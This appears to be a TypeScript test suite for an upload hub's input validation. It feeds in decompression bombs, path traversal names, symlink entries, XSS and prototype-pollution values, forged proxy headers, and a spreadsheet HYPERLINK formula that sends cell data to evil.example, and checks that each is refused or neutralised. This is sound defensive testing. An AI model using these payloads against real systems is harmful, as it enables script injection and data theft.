/**
 * Hostile bundles: decompression bombs, path traversal and non-regular entries in the archive. The Hub
 * unpacks every upload with unpackBundle (src/hub.ts) before any check runs.
 */
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';
import { packTarGz } from '../../director/src/submissions.js';
import { unpackBundle } from '../src/hub.js';
import { LIMITS, sanityErrors } from '../src/sanity.js';
import { toCsv } from '../src/open-data/formats.js';
import type { TableDef } from '../src/open-data/tables.js';
import { clientIp, isCloudflare } from '../src/ratelimit.js';
import { jsonDepth, SHAPE_LIMITS, shapeErrors } from '../src/shape.js';

const MB = 2 ** 20;
const ok = (files: Record<string, string>) => packTarGz(new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])));

/** A tar with one entry of the given name and type flag (packTarGz only writes regular files). */
function entry(name: string, type: string, data = Buffer.alloc(0)): Buffer {
  const tar = gunzipSync(ok({ placeholder: data.toString() }));
  tar.write(name.padEnd(100, '\0'), 0, 100, 'utf8');
  tar.write(type, 156, 1, 'utf8');
  tar.fill(' ', 148, 156);
  let sum = 0;
  for (const b of tar.subarray(0, 512)) sum += b;
  tar.write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8, 'utf8');
  return gzipSync(tar);
}
test('a well-formed flat bundle unpacks', () => {
  const files = unpackBundle(ok({ 'bundle.json': '{}', 'events.jsonl': '' }), 10 * MB);
  assert.deepEqual([...files.keys()].sort(), ['bundle.json', 'events.jsonl']);
});

test('a decompression bomb is refused before it is parsed', () => {
  const bomb = gzipSync(Buffer.alloc(20 * MB), { level: 9 });
  assert.ok(bomb.length < 100 * 1024, 'the bomb is small on the wire');
  assert.throws(() => unpackBundle(bomb, 5 * MB), /larger than 5 MB unpacked/);
});

test('garbage is refused', () => {
  assert.throws(() => unpackBundle(Buffer.from('not gzip at all'), 5 * MB), /not a valid \.tar\.gz/);
});

for (const name of ['../escape.json', '/etc/passwd', 'sub/dir.json', '..', '.hidden', 'a/../../b']) {
  test(`path traversal is refused: ${JSON.stringify(name)}`, () => {
    assert.throws(() => unpackBundle(ok({ [name]: 'x' }), 5 * MB), /must be flat/);
  });
}

for (const [type, what] of [['2', 'symlink'], ['1', 'hard link'], ['3', 'character device'], ['6', 'fifo']]) {
  test(`non-regular entries are refused: ${what}`, () => {
    assert.throws(() => unpackBundle(entry('events.jsonl', type!), 5 * MB), /only regular files/);
  });
}

test('duplicate names are refused', () => {
  const tar = Buffer.concat([gunzipSync(ok({ 'a.json': '1' })).subarray(0, 1024), gunzipSync(ok({ 'a.json': '2' }))]);
  assert.throws(() => unpackBundle(gzipSync(tar), 5 * MB), /duplicate file/);
});

// ---------------------------------------------------------------------------
// Content limits (src/sanity.ts): fields that reach export paths, markup and loops.

const start = (over: Record<string, unknown> = {}) => ({
  t: 1, type: 'event_start', id: 'ev-1', set: { code: 'FRA', name: 'Final Fantasy' }, seed: 's', best_of: 3,
  seats: [{ name: 'a', kind: 'agent', position: 0, harness: 'claude-code', model: 'claude-sonnet-5-5', effort: 'high' }, { name: 'b', kind: 'agent', position: 1 }],
  ...over,
});
const log = (...records: object[]) => {
  const files = new Map<string, Buffer>([['events.jsonl', Buffer.from(records.map((r) => JSON.stringify(r)).join('\n') + '\n')]]);
  return files;
};
const gameOver = (over: Record<string, unknown>) => ({ t: 2, type: 'game_over', game: 'a vs b — game 1', winner: 'a', turns: 9, ...over });

test('a Director-shaped log passes the content limits', () => {
  const files = log(start(), { t: 2, type: 'decision_offered', game: 'g', seat: 'a', id: 'G1', turn: 1, options: ['Keep', 'Mulligan'], text: 'x' },
    gameOver({ stats: { a: { decisions: 3 } }, cards_played: { a: { cast: { Shock: 2 } } }, final_life: { a: 3, b: -2 }, mulligans: { a: 0, b: 1 } }));
  files.set('summary.json', Buffer.from(JSON.stringify({ standings: [{ name: 'a', matchWins: 1, matchLosses: 0, gameWins: 2, gameLosses: 0 }] })));
  assert.deepEqual(sanityErrors(files), []);
});

for (const [what, files, re] of [
  ['set code with markup (XSS in every page)', log(start({ set: { code: '"><svg onload=alert(1)>' } })), /set\.code/],
  ['set code with a path (writes outside the export)', log(start({ set: { code: '../../../../tmp/x' } })), /set\.code/],
  ['turns as a string (raw HTML in replays)', log(start(), gameOver({ turns: '<img src=x onerror=alert(1)>' })), /turns must be an integer/],
  ['decision turn as a string', log(start(), { t: 2, type: 'decision_offered', game: 'g', seat: 'a', id: 'G1', turn: '<b>1</b>' }), /turn must be an integer/],
  ['options that are not a list', log(start(), { t: 2, type: 'decision_offered', game: 'g', seat: 'a', id: 'G1', turn: 1, options: { length: '<img>' } }), /options/],
  ['stats with markup', log(start(), gameOver({ stats: { a: { auto_passes: '<script>' } } })), /stats\.a\.auto_passes/],
  ['cards_played count of a billion (out-of-memory loop)', log(start(), gameOver({ cards_played: { a: { cast: { Shock: 1e9 } } } })), /cards_played/],
  ['seat position as markup', log(start({ seats: [{ name: 'a', kind: 'agent', position: '<i>' }] })), /position/],
  ['seat named __proto__', log(start({ seats: [{ name: '__proto__', kind: 'agent', position: 0 }] })), /reserved/],
  ['harness with markup', log(start({ seats: [{ name: 'a', kind: 'agent', position: 0, harness: '<script>x</script>' }] })), /harness/],
  ['a megabyte model name (index.json amplification)', log(start({ seats: [{ name: 'a', kind: 'agent', position: 0, model: 'm'.repeat(1 << 20) }] })), /model/],
  ['an oversized note', log(start(), { t: 2, type: 'agent_decision', game: 'g', seat: 'a', id: 'G1', turn: 1, note: 'n'.repeat(LIMITS.note + 1) }), /note is longer/],
  ['a record time in the year 275760 (PTS-1)', log(start(), { t: 8.6e15, type: 'agent_decision', game: 'g', seat: 'a', id: 'G1', turn: 1 }), /t must be a Unix time/],
  ['a record time that is not a number', log(start(), { t: '2026-11-01', type: 'agent_decision', game: 'g', seat: 'a', id: 'G1', turn: 1 }), /t must be a Unix time/],
] as const) {
  test(`content limits refuse: ${what}`, () => {
    const errs = sanityErrors(files);
    assert.ok(errs.some((e) => re.test(e)), errs.join('; ') || 'no errors');
  });
}

test('content limits refuse: duplicate or non-numeric standings', () => {
  const files = log(start());
  files.set('summary.json', Buffer.from(JSON.stringify({ standings: [{ name: 'a', matchWins: 1, gameWins: 2 }, { name: 'a', matchWins: '<b>9</b>' }] })));
  const errs = sanityErrors(files);
  assert.ok(errs.some((e) => /twice/.test(e)) && errs.some((e) => /matchWins/.test(e)), errs.join('; '));
});

test('open-data CSV: agent text that looks like a formula stays text (HUB-25); numbers are untouched', () => {
  const def = { name: 't', description: '', grain: '', key: [], columns: [{ name: 'note', type: 'string', description: '' }, { name: 'n', type: 'int', description: '' }] } as unknown as TableDef;
  const csv = toCsv(def, [
    { note: '=HYPERLINK("https://evil.example/?"&A1,"click")', n: -3 },
    { note: '+1+1', n: 1 }, { note: '-2+3', n: 2 }, { note: '@SUM(A1)', n: 3 }, { note: '\tx', n: 4 }, { note: 'plain = fine', n: 5 },
  ]);
  const rows = csv.trimEnd().split('\r\n').slice(1);
  assert.equal(rows[0], `"'=HYPERLINK(""https://evil.example/?""&A1,""click"")",-3`);
  assert.deepEqual(rows.slice(1, 4), [`'+1+1,1`, `'-2+3,2`, `'@SUM(A1),3`]);
  assert.equal(rows[4], `'\tx,4`);
  assert.equal(rows[5], 'plain = fine,5');
});

test('C-1: the client address behind proxies: the last hop by default, further back with HUB_TRUST_PROXY_HOPS', () => {
  const req = (xff: string) => ({ headers: { 'x-forwarded-for': xff }, socket: { remoteAddress: '10.0.0.9' } }) as unknown as Parameters<typeof clientIp>[0];
  assert.equal(clientIp(req('203.0.113.7'), true, 1), clientIp(req('198.51.100.1, 203.0.113.7'), true, 1), 'the last hop with one trusted proxy');
  assert.notEqual(clientIp(req('203.0.113.7, 104.16.0.1'), true, 2), clientIp(req('198.51.100.1, 104.16.0.1'), true, 2), 'two hops back: Cloudflare in front of Traefik');
  assert.equal(clientIp(req('203.0.113.7'), true, 5), clientIp(req('203.0.113.7'), true, 1), 'more hops than the header has: the first address');
  assert.equal(clientIp(req('203.0.113.7'), false), clientIp({ headers: {}, socket: { remoteAddress: '10.0.0.9' } } as unknown as Parameters<typeof clientIp>[0], false), 'untrusted: the socket address');
});

test('HUB-32: behind Cloudflare, CF-Connecting-IP only from a Cloudflare edge', () => {
  type Req = Parameters<typeof clientIp>[0];
  const req = (xff: string, cf?: string, peer = '10.0.15.2') =>
    ({ headers: { 'x-forwarded-for': xff, ...(cf ? { 'cf-connecting-ip': cf } : {}) }, socket: { remoteAddress: peer } }) as unknown as Req;
  // Traefik drops Cloudflare's X-Forwarded-For (untrusted) and appends the edge it saw.
  assert.equal(clientIp(req('172.70.1.1', '203.0.113.7'), true, 1, true), '203.0.113.7', 'through Cloudflare: the client Cloudflare names');
  assert.equal(clientIp(req('172.70.1.1', '2001:db8:1:2:3:4:5:6'), true, 2, true), '2001:db8:1:2::/64', 'an IPv6 client by /64, whatever the hops');
  assert.notEqual(clientIp(req('172.70.1.1', '203.0.113.7'), true, 1, true), clientIp(req('172.70.1.1', '198.51.100.1'), true, 1, true), 'two visitors of one edge: two keys');
  // Straight to the origin (bypassing Cloudflare): the header is the client's own claim.
  assert.equal(clientIp(req('198.51.100.9', '203.0.113.7'), true, 2, true), '198.51.100.9', 'a forged CF-Connecting-IP from a non-Cloudflare address is ignored');
  assert.equal(clientIp(req('172.70.1.1', 'not-an-ip'), true, 1, true), '172.70.1.1', 'a malformed header: the edge address');
  assert.equal(clientIp(req('172.70.1.1', '203.0.113.7'), true, 1, false), '172.70.1.1', 'off unless HUB_TRUST_CLOUDFLARE');
  assert.equal(clientIp(req('', '203.0.113.7', '::ffff:104.16.5.5'), false, 1, true), '203.0.113.7', 'no proxy in between: the socket peer is the edge');
  assert.ok(isCloudflare('2a06:98c0::1') && isCloudflare('104.16.0.1') && !isCloudflare('203.0.113.7') && !isCloudflare('junk'));
  assert.ok(isCloudflare('192.0.2.1', '192.0.2.0/24') && !isCloudflare('104.16.0.1', '192.0.2.0/24'), 'HUB_CLOUDFLARE_IPS replaces the list');
});

test('HUB-33: bundles nested too deep or holding too many records are refused before parsing', () => {
  const files = (log: string, extra: Record<string, string> = {}) => new Map(Object.entries({ 'events.jsonl': log, 'summary.json': '{"standings":[]}', ...extra }).map(([k, v]) => [k, Buffer.from(v)]));
  const deep = (d: number) => `{"t":1,"type":"note","x":${'['.repeat(d)}${']'.repeat(d)}}\n`;
  assert.deepEqual(shapeErrors(files(deep(20))), [], 'ordinary nesting passes');
  assert.match(shapeErrors(files(deep(5000))).join(), /nested deeper than 64/, 'the depth that overflows the scrubbers is refused');
  assert.match(shapeErrors(files('{"t":1}\n', { 'seats-meta.json': `{"a":${'{"b":'.repeat(100)}1${'}'.repeat(100)}}` })).join(), /seats-meta\.json is nested/, 'every JSON file of the bundle');
  assert.deepEqual(shapeErrors(files('{"t":1,"s":"[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[\\"[[["}\n')), [], 'brackets inside strings (and escaped quotes) are text');
  assert.deepEqual(shapeErrors(files('[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[\n'.repeat(3))), [], 'JSONL: a malformed line does not carry its depth to the next');
  assert.equal(jsonDepth('{"a":[{"b":[]}]}', 64), 4);
  const many = '{"t":1,"type":"x"}\n'.repeat(SHAPE_LIMITS.records + 1);
  assert.match(shapeErrors(files(many)).join(), /more than 250000 records/);
  assert.deepEqual(shapeErrors(files('{"t":1,"type":"x"}\n\n\n'.repeat(1000))), [], 'blank lines are not records');
});
